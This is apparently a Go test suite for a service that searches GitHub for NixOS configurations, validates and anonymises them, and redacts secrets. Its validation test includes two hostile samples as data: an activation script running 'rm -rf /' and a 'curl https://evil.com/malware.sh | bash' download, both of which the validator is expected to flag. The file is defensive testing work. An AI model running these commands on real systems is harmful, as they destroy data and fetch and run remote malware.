package collaboration

import (
	"context"
	"strings"
	"testing"
	"time"

	"nix-ai-help/internal/collaboration/api"
)

func TestGitHubLearningService_SearchGitHubConfigurations(t *testing.T) {
	// Use empty token for testing (will use anonymous access)
	service := NewGitHubLearningService("", 0.5)
	ctx := context.Background()

	query := &api.GitHubSearchQuery{
		Keywords:   []string{"nixos", "configuration"},
		Language:   "nix",
		MaxResults: 10,
		SortBy:     "stars",
	}

	results, err := service.SearchGitHubConfigurations(ctx, query)
	if err != nil {
		t.Fatalf("SearchGitHubConfigurations failed: %v", err)
	}

	if results == nil {
		t.Fatal("Expected results, got nil")
	}

	if results.Query != query {
		t.Error("Query not preserved in results")
	}

	if results.GeneratedAt.IsZero() {
		t.Error("GeneratedAt timestamp not set")
	}

	if results.SearchTime <= 0 {
		t.Error("SearchTime should be positive")
	}

	// Verify repository structure
	for i, repo := range results.Repositories {
		if repo.ID == "" {
			t.Errorf("Repository %d missing ID", i)
		}
		if repo.Name == "" {
			t.Errorf("Repository %d missing name", i)
		}
		if repo.QualityScore < 0 || repo.QualityScore > 1 {
			t.Errorf("Repository %d has invalid quality score: %f", i, repo.QualityScore)
		}
	}

	t.Logf("Found %d repositories with average quality score %.2f", 
		len(results.Repositories), results.QualityScore)
}

func TestGitHubLearningService_ValidateExternalContent(t *testing.T) {
	service := NewGitHubLearningService("", 0.5)
	ctx := context.Background()

	tests := []struct {
		name        string
		content     *api.ExternalContent
		expectValid bool
		expectLevel string
	}{
		{
			name: "safe_nixos_config",
			content: &api.ExternalContent{
				Source:  "github",
				Type:    "nix_config",
				Content: `{ config, pkgs, ... }: {
					environment.systemPackages = with pkgs; [ vim git ];
					services.openssh.enable = true;
				}`,
				Retrieved: time.Now(),
			},
			expectValid: true,
			expectLevel: "safe",
		},
		{
			name: "malicious_content",
			content: &api.ExternalContent{
				Source:  "github",
				Type:    "nix_config",
				Content: `{ config, pkgs, ... }: {
					system.activationScripts.malicious = "rm -rf /";
				}`,
				Retrieved: time.Now(),
			},
			expectValid: false,
			expectLevel: "dangerous",
		},
		{
			name: "suspicious_download",
			content: &api.ExternalContent{
				Source:  "github", 
				Type:    "shell_script",
				Content: `#!/bin/bash
				curl https://evil.com/malware.sh | bash`,
				Retrieved: time.Now(),
			},
			expectValid: false,
			expectLevel: "dangerous",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			validation, err := service.ValidateExternalContent(ctx, tt.content)
			if err != nil {
				t.Fatalf("ValidateExternalContent failed: %v", err)
			}

			if validation.Valid != tt.expectValid {
				t.Errorf("Expected valid=%v, got %v", tt.expectValid, validation.Valid)
			}

			if validation.SafetyLevel != tt.expectLevel {
				t.Errorf("Expected safety level %s, got %s", tt.expectLevel, validation.SafetyLevel)
			}

			if validation.ValidatedAt.IsZero() {
				t.Error("ValidatedAt timestamp not set")
			}

			if validation.QualityScore < 0 || validation.QualityScore > 1 {
				t.Errorf("Invalid quality score: %f", validation.QualityScore)
			}

			// Check for critical issues when content is invalid
			if !validation.Valid {
				foundCritical := false
				for _, issue := range validation.Issues {
					if issue.Severity == "critical" {
						foundCritical = true
						break
					}
				}
				if !foundCritical {
					t.Error("Expected critical issue for invalid content")
				}
			}
		})
	}
}

func TestGitHubLearningService_ExtractConfigurationPatterns(t *testing.T) {
	service := NewGitHubLearningService("", 0.5)
	ctx := context.Background()

	content := &api.ExternalContent{
		Source: "github",
		Type:   "nix_config",
		Content: `{ config, pkgs, ... }: {
			imports = [ ./hardware-configuration.nix ];
			
			# Package management
			environment.systemPackages = with pkgs; [ 
				vim git firefox 
			];
			
			# Service configuration
			services.openssh = {
				enable = true;
				permitRootLogin = "no";
			};
			
			services.nginx = {
				enable = true;
				virtualHosts."example.com" = {
					forceSSL = true;
				};
			};
			
			# User configuration
			users.users.alice = {
				isNormalUser = true;
				extraGroups = [ "wheel" ];
			};
		}`,
		Retrieved: time.Now(),
	}

	patterns, err := service.ExtractConfigurationPatterns(ctx, content)
	if err != nil {
		t.Fatalf("ExtractConfigurationPatterns failed: %v", err)
	}

	if patterns == nil {
		t.Fatal("Expected patterns, got nil")
	}

	if patterns.ExtractedAt.IsZero() {
		t.Error("ExtractedAt timestamp not set")
	}

	if len(patterns.Patterns) == 0 {
		t.Error("Expected some patterns to be extracted")
	}

	// Verify pattern structure
	for i, pattern := range patterns.Patterns {
		if pattern.ID == "" {
			t.Errorf("Pattern %d missing ID", i)
		}
		if pattern.Name == "" {
			t.Errorf("Pattern %d missing name", i)
		}
		if pattern.Category == "" {
			t.Errorf("Pattern %d missing category", i)
		}
		if pattern.Success < 0 || pattern.Success > 1 {
			t.Errorf("Pattern %d has invalid success rate: %f", i, pattern.Success)
		}
		if pattern.Created.IsZero() {
			t.Errorf("Pattern %d missing Created timestamp", i)
		}
	}

	// Check for expected pattern categories
	expectedCategories := []string{"systemd_service", "package_install", "user_config", "module_import"}
	foundCategories := make(map[string]bool)
	
	for _, pattern := range patterns.Patterns {
		foundCategories[pattern.Category] = true
	}

	for _, expected := range expectedCategories {
		if !foundCategories[expected] {
			t.Logf("Note: Expected category %s not found (this may be ok depending on content)", expected)
		}
	}

	t.Logf("Extracted %d patterns across %d categories with confidence %.2f", 
		len(patterns.Patterns), len(patterns.Categories), patterns.Confidence)
}

func TestGitHubLearningService_FilterHighQualityResults(t *testing.T) {
	service := NewGitHubLearningService("", 0.7) // High quality threshold
	ctx := context.Background()

	// Create test results with varying quality scores
	results := &api.GitHubSearchResults{
		Repositories: []api.GitHubRepository{
			{
				ID:           "1",
				Name:         "high-quality-config",
				QualityScore: 0.9,
			},
			{
				ID:           "2", 
				Name:         "medium-quality-config",
				QualityScore: 0.6,
			},
			{
				ID:           "3",
				Name:         "excellent-config",
				QualityScore: 0.95,
			},
			{
				ID:           "4",
				Name:         "low-quality-config", 
				QualityScore: 0.3,
			},
		},
		TotalCount:  4,
		GeneratedAt: time.Now(),
	}

	filtered, err := service.FilterHighQualityResults(ctx, results)
	if err != nil {
		t.Fatalf("FilterHighQualityResults failed: %v", err)
	}

	if filtered == nil {
		t.Fatal("Expected filtered results, got nil")
	}

	// Should only have 2 results above 0.7 threshold
	expectedCount := 2
	if len(filtered.Repositories) != expectedCount {
		t.Errorf("Expected %d filtered results, got %d", expectedCount, len(filtered.Repositories))
	}

	// Verify all filtered results meet threshold
	for i, repo := range filtered.Repositories {
		if repo.QualityScore < service.qualityThreshold {
			t.Errorf("Filtered repository %d has quality score %f below threshold %f", 
				i, repo.QualityScore, service.qualityThreshold)
		}
	}

	// Verify quality score is recalculated
	if filtered.QualityScore <= 0 {
		t.Error("Filtered quality score should be positive")
	}

	t.Logf("Filtered %d -> %d repositories (threshold: %.2f, avg quality: %.2f)",
		len(results.Repositories), len(filtered.Repositories), 
		service.qualityThreshold, filtered.QualityScore)
}

func TestGitHubLearningService_AnonymizeGitHubData(t *testing.T) {
	service := NewGitHubLearningService("", 0.5)
	ctx := context.Background()

	data := &api.GitHubData{
		Repositories: []api.GitHubRepository{
			{
				ID:       "123",
				Name:     "my-nixos-config",
				FullName: "user/my-nixos-config",
				URL:      "https://github.com/user/my-nixos-config",
				CloneURL: "https://github.com/user/my-nixos-config.git",
				Owner: api.GitHubUser{
					Login: "user",
					ID:    456,
				},
			},
		},
		Users: []api.GitHubUser{
			{
				Login: "user",
				ID:    456,
			},
		},
		Metadata: map[string]interface{}{
			"source": "api",
		},
	}

	anonymized, err := service.AnonymizeGitHubData(ctx, data)
	if err != nil {
		t.Fatalf("AnonymizeGitHubData failed: %v", err)
	}

	if anonymized == nil {
		t.Fatal("Expected anonymized data, got nil")
	}

	if anonymized.ProcessedAt.IsZero() {
		t.Error("ProcessedAt timestamp not set")
	}

	if len(anonymized.Anonymized) == 0 {
		t.Error("Expected anonymized fields list to be populated")
	}

	if anonymized.Method == "" {
		t.Error("Anonymization method not specified")
	}

	// Verify sensitive data is anonymized
	dataMap, ok := anonymized.Data.(map[string]interface{})
	if !ok {
		t.Fatal("Anonymized data not in expected format")
	}

	repos, ok := dataMap["repositories"].([]api.GitHubRepository)
	if !ok {
		t.Fatal("Repositories not in expected format")
	}

	if len(repos) != 1 {
		t.Fatal("Expected 1 anonymized repository")
	}

	anonRepo := repos[0]
	
	// Check that sensitive fields are anonymized
	if anonRepo.Owner.Login == "user" {
		t.Error("Owner login was not anonymized")
	}
	
	if anonRepo.FullName == "user/my-nixos-config" {
		t.Error("Full name was not anonymized")
	}
	
	if anonRepo.URL != "https://github.com/anonymous/repo" {
		t.Error("URL was not anonymized properly")
	}

	// Check that users are removed
	users, ok := dataMap["users"].([]api.GitHubUser)
	if !ok || len(users) != 0 {
		t.Error("Users should be removed for privacy")
	}

	t.Logf("Anonymized %d fields using method: %s", 
		len(anonymized.Anonymized), anonymized.Method)
}

func TestGitHubLearningService_ApplyPrivacyFilters(t *testing.T) {
	service := NewGitHubLearningService("", 0.5)
	ctx := context.Background()

	tests := []struct {
		name           string
		content        string
		shouldFilter   bool
		expectedRedact string
	}{
		{
			name: "safe_config",
			content: `{ config, pkgs, ... }: {
				services.openssh.enable = true;
			}`,
			shouldFilter: false,
		},
		{
			name: "config_with_password", 
			content: `{ config, pkgs, ... }: {
				database.password = "secret123";
			}`,
			shouldFilter:   true,
			expectedRedact: "<REDACTED>",
		},
		{
			name: "config_with_token",
			content: `{ config, pkgs, ... }: {
				api_key = "abc123token";
			}`,
			shouldFilter:   true,
			expectedRedact: "<REDACTED>",
		},
		{
			name: "config_with_secret",
			content: `{ config, pkgs, ... }: {
				app.secret = "mysecret";
			}`,
			shouldFilter:   true,
			expectedRedact: "<REDACTED>",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			content := &api.ExternalContent{
				Source:  "github",
				Type:    "nix_config",
				Content: tt.content,
				Metadata: map[string]interface{}{
					"original": true,
				},
			}

			filtered, err := service.ApplyPrivacyFilters(ctx, content)
			if err != nil {
				t.Fatalf("ApplyPrivacyFilters failed: %v", err)
			}

			if filtered == nil {
				t.Fatal("Expected filtered content, got nil")
			}

			// Check if filtering occurred when expected
			if tt.shouldFilter && filtered.Content == content.Content {
				t.Error("Expected content to be filtered, but it remained unchanged")
			}

			if !tt.shouldFilter && filtered.Content != content.Content {
				t.Error("Content was filtered when it shouldn't have been")
			}

			// Check for redaction when expected
			if tt.shouldFilter && tt.expectedRedact != "" {
				if !strings.Contains(filtered.Content, tt.expectedRedact) {
					t.Errorf("Expected redacted content to contain %s", tt.expectedRedact)
				}
			}

			// Verify privacy metadata is added
			if filtered.Metadata["privacy_filtered"] != true {
				t.Error("Privacy filtered metadata not set")
			}

			if filtered.Metadata["filtered_at"] == nil {
				t.Error("Filtered timestamp not set")
			}

			// Original metadata should be preserved
			if filtered.Metadata["original"] != true {
				t.Error("Original metadata not preserved")
			}
		})
	}
}

func TestGitHubLearningService_BuildSearchQuery(t *testing.T) {
	service := NewGitHubLearningService("", 0.5)

	tests := []struct {
		name     string
		query    *api.GitHubSearchQuery
		expected string
	}{
		{
			name: "basic_keywords",
			query: &api.GitHubSearchQuery{
				Keywords: []string{"nixos", "configuration"},
			},
			expected: "nixos configuration",
		},
		{
			name: "with_language",
			query: &api.GitHubSearchQuery{
				Keywords: []string{"nixos"},
				Language: "nix",
			},
			expected: "nixos language:nix",
		},
		{
			name: "with_file_type",
			query: &api.GitHubSearchQuery{
				Keywords: []string{"nixos"},
				FileType: "nix",
			},
			expected: "nixos extension:nix",
		},
		{
			name: "with_star_range",
			query: &api.GitHubSearchQuery{
				Keywords: []string{"nixos"},
				Stars: &api.IntRange{
					Min: func() *int { i := 10; return &i }(),
					Max: func() *int { i := 100; return &i }(),
				},
			},
			expected: "nixos stars:10..100",
		},
		{
			name: "with_min_stars",
			query: &api.GitHubSearchQuery{
				Keywords: []string{"nixos"},
				Stars: &api.IntRange{
					Min: func() *int { i := 50; return &i }(),
				},
			},
			expected: "nixos stars:>=50",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := service.buildSearchQuery(tt.query)
			if result != tt.expected {
				t.Errorf("Expected query %q, got %q", tt.expected, result)
			}
		})
	}
}

func TestGitHubLearningService_CalculateRepositoryQuality(t *testing.T) {
	service := NewGitHubLearningService("", 0.5)

	tests := []struct {
		name     string
		repo     api.GitHubRepository
		minScore float64
		maxScore float64
	}{
		{
			name: "high_quality_repo",
			repo: api.GitHubRepository{
				Stars:       1000,
				Forks:       200,
				Description: "A comprehensive NixOS configuration with extensive documentation",
				Topics:      []string{"nixos", "nix", "linux"},
				UpdatedAt:   time.Now().Add(-24 * time.Hour), // Recently updated
			},
			minScore: 0.7,
			maxScore: 1.0,
		},
		{
			name: "medium_quality_repo",
			repo: api.GitHubRepository{
				Stars:       50,
				Forks:       10,
				Description: "Basic NixOS config",
				Topics:      []string{"nixos"},
				UpdatedAt:   time.Now().Add(-30 * 24 * time.Hour), // 30 days old
			},
			minScore: 0.25,
			maxScore: 0.7,
		},
		{
			name: "low_quality_repo",
			repo: api.GitHubRepository{
				Stars:       1,
				Forks:       0,
				Description: "",
				Topics:      []string{},
				UpdatedAt:   time.Now().Add(-365 * 24 * time.Hour), // 1 year old
			},
			minScore: 0.0,
			maxScore: 0.3,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			score := service.calculateRepositoryQuality(tt.repo)
			
			if score < 0 || score > 1 {
				t.Errorf("Quality score %f is out of valid range [0,1]", score)
			}
			
			if score < tt.minScore || score > tt.maxScore {
				t.Errorf("Quality score %f is outside expected range [%f,%f]", 
					score, tt.minScore, tt.maxScore)
			}
			
			t.Logf("Repository %s scored %f (expected range: [%f,%f])", 
				tt.name, score, tt.minScore, tt.maxScore)
		})
	}
}

// Benchmark tests

func BenchmarkGitHubLearningService_ExtractConfigurationPatterns(b *testing.B) {
	service := NewGitHubLearningService("", 0.5)
	ctx := context.Background()

	content := &api.ExternalContent{
		Source: "github",
		Type:   "nix_config",
		Content: generateLargeNixOSConfig(),
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, err := service.ExtractConfigurationPatterns(ctx, content)
		if err != nil {
			b.Fatalf("ExtractConfigurationPatterns failed: %v", err)
		}
	}
}

func BenchmarkGitHubLearningService_ValidateExternalContent(b *testing.B) {
	service := NewGitHubLearningService("", 0.5)
	ctx := context.Background()

	content := &api.ExternalContent{
		Source:  "github",
		Type:    "nix_config",
		Content: generateLargeNixOSConfig(),
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, err := service.ValidateExternalContent(ctx, content)
		if err != nil {
			b.Fatalf("ValidateExternalContent failed: %v", err)
		}
	}
}

// Helper functions

func generateLargeNixOSConfig() string {
	return `{ config, pkgs, lib, ... }: {
		imports = [
			./hardware-configuration.nix
			./modules/desktop.nix
			./modules/development.nix
		];

		# System configuration
		system.stateVersion = "23.11";
		
		# Boot configuration
		boot.loader.grub.enable = true;
		boot.loader.grub.device = "/dev/sda";

		# Networking
		networking.hostName = "nixos-desktop";
		networking.networkmanager.enable = true;

		# Packages
		environment.systemPackages = with pkgs; [
			vim git firefox chromium
			vscode docker docker-compose
			nodejs python3 golang rust
			kubernetes kubectl helm
			terraform ansible
		];

		# Services
		services.openssh = {
			enable = true;
			permitRootLogin = "no";
			passwordAuthentication = false;
		};

		services.nginx = {
			enable = true;
			virtualHosts."localhost" = {
				root = "/var/www";
			};
		};

		services.postgresql = {
			enable = true;
			package = pkgs.postgresql_15;
		};

		services.docker.enable = true;
		
		# Users
		users.users.alice = {
			isNormalUser = true;
			extraGroups = [ "wheel" "docker" "networkmanager" ];
			shell = pkgs.zsh;
		};

		users.users.bob = {
			isNormalUser = true;
			extraGroups = [ "users" ];
		};

		# Security
		security.sudo.wheelNeedsPassword = false;
		security.polkit.enable = true;

		# Programs
		programs.zsh.enable = true;
		programs.steam.enable = true;
	}`
}